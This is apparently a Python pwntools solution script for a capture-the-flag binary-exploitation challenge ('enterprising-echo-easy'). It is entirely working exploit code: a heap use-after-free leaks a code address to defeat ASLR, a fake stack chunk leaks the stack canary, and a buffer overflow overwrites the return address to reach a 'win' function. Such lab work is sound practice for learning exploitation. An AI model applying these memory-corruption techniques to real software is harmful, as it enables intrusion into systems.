from pwn import *

p = process("/challenge/enterprising-echo-easy")

binecho_offset = 0x33f8
win_offset = 0x1a22

print(p.clean())

p.sendline(b"malloc 0 32")
p.sendline(b"free 0")

print(p.clean())

p.sendline(b"echo 0 0")
x = p.clean()
binecho_addr = int(''.join([x.split(b"Data: ")[1].split(b"\n")[0].hex()[i:i+2] for i in range(0, len(x.split(b"Data: ")[1].split(b"\n")[0].hex()), 2)][::-1]), 16) # sorry <3 just to filter, clean and format leaked address
base_addr = binecho_addr - binecho_offset
win_addr = base_addr + win_offset

print(b"[+] Leaked Base Addr ::", hex(base_addr))

p.sendline(b"stack_scanf")
p.sendline(b"\x00" * (64 - 8) + p64(0x90))
p.sendline(b"stack_free")

p.sendline(b"malloc 1 130")
print(p.clean())

p.sendline(b"echo 1 73")
x = p.clean()
canary = int(''.join([x.split(b"Data: ")[1].split(b"\n")[0].hex()[i:i+2] for i in range(0, len(x.split(b"Data: ")[1].split(b"\n")[0].hex()), 2)][::-1]) + '00', 16)

print(b"[+] Leaked Canary :: ", hex(canary))

p.sendline(b"scanf")
p.sendline(b"1")
p.sendline(b"\x90" * 72 + p64(canary) + p64(0x90) + p64(win_addr)) # buffer + canary + space + ret_addr

print(p.clean())

p.sendline(b"quit")

print(p.clean())

p.close()
